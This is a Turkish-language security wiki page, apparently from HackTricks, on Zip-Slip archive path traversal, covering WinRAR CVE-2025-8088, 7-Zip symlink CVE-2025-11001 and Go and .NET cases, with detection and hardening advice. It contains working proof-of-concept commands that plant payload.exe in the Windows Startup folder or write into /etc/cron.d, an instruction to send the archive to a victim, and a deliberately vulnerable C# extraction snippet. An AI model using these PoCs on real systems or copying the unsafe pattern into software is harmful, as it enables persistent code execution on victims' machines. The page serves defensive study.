# Archive Extraction Path Traversal ("Zip-Slip" / WinRAR CVE-2025-8088)

{{#include ../banners/hacktricks-training.md}}

## Genel Bakış

Birçok archive formatı (ZIP, RAR, TAR, 7-ZIP vb.), her entry'nin kendi **internal path** bilgisini taşımasına izin verir. Bir extraction utility bu path bilgisini sorgulamadan kabul ettiğinde, `..` veya **absolute path** (ör. `C:\Windows\System32\`) içeren hazırlanmış bir filename, kullanıcı tarafından seçilen directory'nin dışına yazılır.
Bu vulnerability sınıfı, yaygın olarak *Zip-Slip* veya **archive extraction path traversal** olarak bilinir.<sup>[[6]](#references)</sup>

Sonuçlar, arbitrary file'ların üzerine yazılmasından, Windows *Startup* folder gibi bir **auto-run** konumuna payload bırakılarak doğrudan **remote code execution (RCE)** elde edilmesine kadar uzanabilir.

## Temel Neden

1. Attacker, bir veya daha fazla file header'ın şunları içerdiği bir archive oluşturur:
* Relative traversal sequences (`..\..\..\Users\\victim\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\payload.exe`)
* Absolute paths (`C:\\ProgramData\\Microsoft\\Windows\\Start Menu\\Programs\\StartUp\\payload.exe`)
* Veya target dir dışına çözümlenen hazırlanmış **symlinks** (*nix üzerinde ZIP/TAR'da yaygın).
2. Victim, embedded path bilgisine güvenen (veya symlink'leri takip eden), bunu sanitise etmek ya da extraction işlemini seçilen directory'nin altında zorlamak yerine vulnerable bir tool ile archive'ı extract eder.
3. File, attacker-controlled location'a yazılır ve system veya user bu path'i bir sonraki kez tetiklediğinde çalıştırılır/yüklenir.

### .NET `Path.Combine` + `ZipArchive` traversal

Yaygın bir .NET anti-pattern, amaçlanan destination'ı **user-controlled** `ZipArchiveEntry.FullName` ile birleştirmek ve path normalisation uygulamadan extract etmektir:<sup>[[4]](#references)</sup>
```csharp
using (var zip = ZipFile.OpenRead(zipPath))
{
foreach (var entry in zip.Entries)
{
var dest = Path.Combine(@"C:\samples\queue\", entry.FullName); // drops base if FullName is absolute
entry.ExtractToFile(dest);
}
}
```
- `entry.FullName` `..\\` ile başlıyorsa traversal gerçekleştirir; **absolute path** ise sol taraftaki bileşen tamamen atılır ve extraction identity olarak **arbitrary file write** elde edilir.
- Zamanlanmış bir scanner tarafından izlenen kardeş `app` dizinine yazmak için proof-of-concept archive:
```python
import zipfile
with zipfile.ZipFile("slip.zip", "w") as z:
z.writestr("../app/0xdf.txt", "ABCD")
```
Bu ZIP dosyasının izlenen gelen kutusuna bırakılması `C:\samples\app\0xdf.txt` dosyasının oluşturulmasına neden olur; bu da `C:\samples\queue\` dışına traversal yapılabildiğini ve devamındaki primitive'lerin (ör. DLL hijacks) etkinleştirilebildiğini kanıtlar.

## Gerçek Dünya Örneği – WinRAR ≤ 7.12 (CVE-2025-8088)

Windows için WinRAR (`rar` / `unrar` CLI, DLL ve portable source dahil), extraction sırasında dosya adlarını doğrulayamıyordu.
Aşağıdaki gibi bir entry içeren malicious RAR archive:
```text
..\..\..\Users\victim\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\payload.exe
```
seçilen çıktı dizininin **dışında** ve kullanıcının *Startup* klasörünün içinde bulunurdu. Windows, oturum açıldıktan sonra burada bulunan her şeyi otomatik olarak çalıştırarak *kalıcı* RCE sağlardı.<sup>[[5]](#references)</sup>

### PoC Archive Oluşturma (Linux/Mac)
```bash
# Requires rar >= 6.x
mkdir -p "evil/../../../Users/Public/AppData/Roaming/Microsoft/Windows/Start Menu/Programs/Startup"
cp payload.exe "evil/../../../Users/Public/AppData/Roaming/Microsoft/Windows/Start Menu/Programs/Startup/"
rar a -ep evil.rar evil/*
```
Kullanılan seçenekler:
* `-ep`  – dosya yollarını tam olarak verildiği şekilde sakla (başlangıçtaki `./` ifadelerini **kırpma**).

`evil.rar` dosyasını kurbana gönderin ve arşivi güvenlik açığı bulunan bir WinRAR build'iyle çıkarmasını söyleyin.

### Vahşi Ortamda Gözlemlenen Exploitation

ESET, özelleştirilmiş backdoor'lar dağıtmak ve ransomware operasyonlarını kolaylaştırmak amacıyla CVE-2025-8088'i kötüye kullanan RAR arşivlerinin ek olarak gönderildiği RomCom (Storm-0978/UNC2596) spear-phishing kampanyalarını bildirdi.<sup>[[5]](#references)</sup>

## Daha Yeni Vakalar (2024–2025)

### 7-Zip ZIP symlink traversal → RCE (CVE-2025-11001 / ZDI-25-949)
* **Bug**: **symbolic link** olan ZIP girdilerinin extraction sırasında dereference edilmesi, saldırganların hedef dizinin dışına çıkıp istedikleri yolların üzerine yazmasına olanak sağladı. Kullanıcı etkileşimi yalnızca arşivi *açmak/çıkarmaktır*.<sup>[[1]](#references)</sup>
* **Affected**: 7-Zip 21.02–24.09 (Windows ve Linux build'leri). **25.00** (Temmuz 2025) ve sonraki sürümlerde düzeltildi.
* **Impact path**: `Start Menu/Programs/Startup` veya service-run konumlarının üzerine yazmak → sonraki logon'da ya da service restart sonrasında kod çalışır.
* **Quick PoC (Linux)**:
```bash
mkdir -p out
ln -s /etc/cron.d evil
zip -y exploit.zip evil   # -y preserves symlinks
7z x exploit.zip -o/tmp/target   # vulnerable 7-Zip writes to /etc/cron.d
```
Patched bir build'de `/etc/cron.d` etkilenmez; symlink, `/tmp/target` içinde bir link olarak çıkarılır.

### Go mholt/archiver Unarchive() Zip-Slip (CVE-2025-3445)
* **Bug**: `archiver.Unarchive()` `../` ve symlink içeren ZIP girdilerini takip ederek `outputDir` dışına yazma işlemi gerçekleştirir.<sup>[[2]](#references)</sup>
* **Affected**: `github.com/mholt/archiver` ≤ 3.5.1 (proje artık deprecated).
* **Fix**: `mholt/archives` ≥ 0.1.0 sürümüne geçin veya yazma işleminden önce canonical-path kontrolleri uygulayın.
* **Minimal reproduction**:
```go
// go test . with archiver<=3.5.1
archiver.Unarchive("exploit.zip", "/tmp/safe")
// exploit.zip holds ../../../../home/user/.ssh/authorized_keys
```

## Detection İpuçları

* **Static inspection** – Arşiv girdilerini listeleyin ve `../`, `..\\`, *absolute paths* (`/`, `C:`) içeren adları veya hedefi extraction dizininin dışında olan *symlink* türündeki girdileri işaretleyin.
* **Canonicalisation** – `realpath(join(dest, name))` değerinin hâlâ `dest` ile başladığından emin olun. Aksi durumda reddedin.<sup>[[3]](#references)</sup>
* **Sandbox extraction** – Disposable bir dizine, *safe* bir extractor kullanarak (ör. `bsdtar --safe --xattrs --no-same-owner`, 7-Zip ≥ 25.00) decompress edin ve ortaya çıkan yolların dizin içinde kaldığını doğrulayın.
* **Endpoint monitoring** – WinRAR/7-Zip vb. tarafından bir arşiv açıldıktan kısa süre sonra `Startup`/`Run`/`cron` konumlarına yeni executable'lar yazılması durumunda alert oluşturun.

## Mitigation & Hardening

1. **Extractor'ı güncelleyin** – WinRAR 7.13+ ve 7-Zip 25.00+, path/symlink sanitisation uygular. Her iki araçta da auto-update hâlâ bulunmamaktadır.
2. Mümkün olduğunda arşivleri “**Do not extract paths**” / “**Ignore paths**” seçenekleriyle çıkarın.
3. Unix'te extraction öncesinde yetkileri düşürün ve bir **chroot/namespace** mount edin; Windows'ta **AppContainer** veya bir sandbox kullanın.
4. Özel kod yazıyorsanız create/write işleminden **önce** `realpath()`/`PathCanonicalize()` ile normalise edin ve hedefin dışına çıkan tüm girdileri reddedin.

## Additional Affected / Historical Cases

* 2018 – Snyk tarafından yayımlanan ve birçok Java/Go/JS library'sini etkileyen büyük *Zip-Slip* advisory'si.<sup>[[6]](#references)</sup>
* 2023 – `-ao` merge sırasında benzer traversal gerçekleştiren 7-Zip CVE-2023-4011.
* 2025 – HashiCorp `go-slug` (CVE-2025-0377): slug'larda TAR extraction traversal (v1.2'de patch).<sup>[[7]](#references)</sup>
* Yazma işleminden önce `PathCanonicalize` / `realpath` çağırmayan tüm özel extraction logic'leri.

## References

- [1] [Trend Micro ZDI-25-949 – 7-Zip symlink ZIP traversal (CVE-2025-11001)](https://www.zerodayinitiative.com/advisories/ZDI-25-949/)
- [2] [JFrog Research – mholt/archiver Zip-Slip (CVE-2025-3445)](https://research.jfrog.com/vulnerabilities/archiver-zip-slip/)
- [3] [Meziantou – Prevent Zip Slip in .NET](https://www.meziantou.net/prevent-zip-slip-in-dotnet.htm)
- [4] [0xdf – HTB Bruno ZipSlip → DLL hijack chain](https://0xdf.gitlab.io/2026/02/24/htb-bruno.html)
- [5] [ESET Research – Update WinRAR tools now: RomCom and others exploiting zero-day vulnerability (CVE-2025-8088)](https://www.welivesecurity.com/en/eset-research/update-winrar-tools-now-romcom-and-others-exploiting-zero-day-vulnerability/)
- [6] [Snyk – Public Disclosure of a Critical Arbitrary File Overwrite Vulnerability: Zip Slip](https://snyk.io/blog/zip-slip-vulnerability/)
- [7] [HashiCorp – HCSEC-2025-01: go-slug Vulnerable to Zip Slip Attack (CVE-2025-0377)](https://discuss.hashicorp.com/t/hcsec-2025-01-hashicorp-go-slug-vulnerable-to-zip-slip-attack/72719)

{{#include ../banners/hacktricks-training.md}}
